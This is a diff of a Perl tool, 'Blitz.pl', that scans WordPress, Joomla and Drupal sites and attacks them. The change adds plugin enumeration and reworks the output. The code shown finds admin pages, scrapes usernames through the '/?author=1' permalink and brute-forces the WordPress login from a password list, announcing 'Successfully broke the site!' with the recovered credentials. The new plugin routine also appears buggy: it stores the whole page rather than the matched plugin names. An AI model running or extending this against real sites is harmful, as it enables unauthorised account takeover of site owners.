@@ -31,9 +31,12 @@ sub changelog {
 print q(
 
 +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=
-CURRENT VERSION: 0.1.0
+CURRENT VERSION: 0.1.1
 
 Changes made:
+
+Version 0.1.1 -
+WordPress Plugin searching has been added, cleaned up output
 
 Version 0.1.0 -
 Basic WordPress scanning and attacking has been completed, Bug fixes, output fixes,
@@ -69,9 +72,9 @@ sub help {
 
   Example:
 
-  perl Blitz.pl -c wordpress -b -p -u -t target.com -ul users.txt -pl list.txt
+  perl Blitz.pl -c wordpress -b -p -u -t target.com -pl list.txt
 
-  perl Blitz.pl -cms joomla -brute -ulist users.txt -pl pass.txt
+  perl Blitz.pl -cms joomla -brute -pl pass.txt
 
   IMPORTANT: Only supported CMS' are: WordPress, Joomla!, and Drupal. More to come.
 
@@ -143,7 +146,7 @@ if ($help ne ''){
     exit(0);
   }
 }
-#-- Works
+
 if ($brute){
   if($plist eq ''){
     help();
@@ -178,12 +181,17 @@ if (($cms eq '') && ($guess eq '')){
 #-- END of variable check
 #-----------------------
 #-- Running stuff
-#-- Everything in this section works
+#-- In development
 
-print color('bright_white'),"$banner\n[*] Target: $target\n";
+#-- Everything in this section works
+print color('bold white'),"$banner\n";
+print color('bold white'),"[*] Target: $target\n";
 
 if ($server){
   status_code();
+}
+if (($plugins) && ($cms =~ /wordpress/i)) {
+  wp_plugin();
 }
 if ($brute) {
   if ($cms =~ /wordpress/i) {
@@ -212,8 +220,8 @@ sub cms_hunt {
     $cms = 'drupal';
   }
   else{
-    print color('bold red'), "[*] Unable to determine CMS\n";
-    print color('magenta'), "[*] Press ENTER to quit...";
+    print color('bold red'), "[-] Unable to determine CMS\n";
+    print color('magenta'), "[-] Press ENTER to quit...";
     <STDIN>;
     print color('reset');
     exit(0);
@@ -223,7 +231,8 @@ sub cms_hunt {
 sub status_code {
   my $code = $bot->get($target);
   print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-  print color('bold green'), "[*] Server status ", $code->status_line, "\n", color('reset');
+  print color('bold white'), "[*] Checking server status\n";
+  print color('bold green'), "[*] Server status: ", $code->status_line, "\n", color('reset');
   print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
 }
 
@@ -241,11 +250,12 @@ sub admin_find {
     my $req = HTTP::Request->new(GET=>$admin); #sends a GET request for the pages
   	my $res = $bot->request($req);
     if ($res -> is_success){
-      print color('bright_cyan'), "[*] Able to get to the admin page!\n[*] $admin\n", color('reset');
+      print color('bold white'), "[*] Able to get to the admin page!\n";
+      print color('bold green'),"[*] $admin\n", color('reset');
       return $admin;
     }
     else {
-      print color('bright_red'), "[*] Unable to get to the admin page!\n", color('reset');
+      print color('bright_red'), "[-] Unable to get to the admin page!\n", color('reset');
       }
     }
   elsif($cms =~ /joomla|joomla!/gi) {
@@ -253,11 +263,12 @@ sub admin_find {
     my $req = HTTP::Request->new(GET=>$admin);
     my $res = $bot->request($req);
     if ($res -> is_success){
-      print color('bright_cyan'), "[*] Able to get to the admin page!\n[*] $admin\n", color('reset');
+      print color('bold white'), "[*] Able to get to the admin page!\n";
+      print color('bold green'),"[*] $admin\n", color('reset');
       return $admin;
     }
     else {
-      print color('bright_red'), "[*] Unable to get to the admin page!\n", color('reset');
+      print color('bright_red'), "[-] Unable to get to the admin page!\n", color('reset');
       }
     }
   elsif($cms =~ /drupal/gi) {
@@ -265,16 +276,17 @@ sub admin_find {
     my $req = HTTP::Request->new(GET=>$admin);
   	my $res = $bot->request($req);
     if ($res -> is_success){
-      print color('bright_cyan'), "[*] Able to get to the admin page!\n[*] $admin\n", color('reset');
+      print color('bold white'), "[*] Able to get to the admin page!\n";
+      print color('bold green'),"[*] $admin\n", color('reset');
       return $admin;
     }
     else {
-      print color('bright_red'), "[*] Unable to get to the admin page!\n", color('reset');
+      print color('bright_red'), "[-] Unable to get to the admin page!\n", color('reset');
     }
   }
 }
 
-#-- Scrapes the username from the author permalink (WordPress only)
+#-- Scrapes the username from the author permalink
 sub wp_user {
   my $user = $target."/?author=1";
   my $req = HTTP::Request ->new(GET=>$user);
@@ -282,7 +294,8 @@ sub wp_user {
   if($userhunt =~/author\/(.*?)\//){
     my $victim = $1;
     print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-    print color('bold green'),"[*] Found a user: $victim\n";
+    print color('bold white'), "[*] Scraping user from $user\n";
+    print color('bold green'),"[*] Found user: $victim\n";
     if ($brute){
       wp_brute($victim);
     }
@@ -294,7 +307,7 @@ sub wp_brute {
   my $victim = shift;
   if ($victim){
     print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
-    print color('bright_cyan'), "[*] Using user: $victim\n";
+    print color('bold green'), "[*] Using user '$victim' for brute force attack\n";
     print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
 
     open my $pass_handle, '<', $plist;
@@ -309,8 +322,8 @@ sub wp_brute {
           my $attempt = $bot->request($login);
           my $status = $attempt-> as_string;
           if (($status =~ /Location:/) && ($status =~ /wordpress_logged_in/)){
-            print color('bold green'), "[*] Broke the site!\n";
-            print "[*] UserName: $victim \n";
+            print color('bold white'), "[*] Successfully broke the site!\n";
+            print color('bold green'),"[*] UserName: $victim \n";
             print "[*] Password: $passwd \n";
             print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
             print color('reset');
@@ -326,5 +339,26 @@ sub drupal_brute {}
 #-- END brute force subroutines
 
 #-- Plugin enumeration subroutines
+
+sub wp_plugin {
+  print color('bold white'), "[*] Looking for plugins... \n";
+  my @plugins;
+  my $plugin = $bot->get($target)->content;
+
+  while ($plugin =~ /plugins\/(.*)\//gi){
+    push @plugins, $plugin;
+    my $p = scalar @plugins;
+    print color('bright_magenta'), "[*] There are $p plugins on the site\n";
+  }
+  foreach (@plugins) {
+    print color('bold green'),"[*] Found plugin: $_\n";
+    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+  }
+
+  if (scalar @plugins == 0){
+    print color('bright_red'),"[-] No plugins found\n";
+    print color('bold yellow'), "+++++++++++++++++++++++++++++++++\n";
+  }
+}
 
 #-- END plugin enumeration subroutines
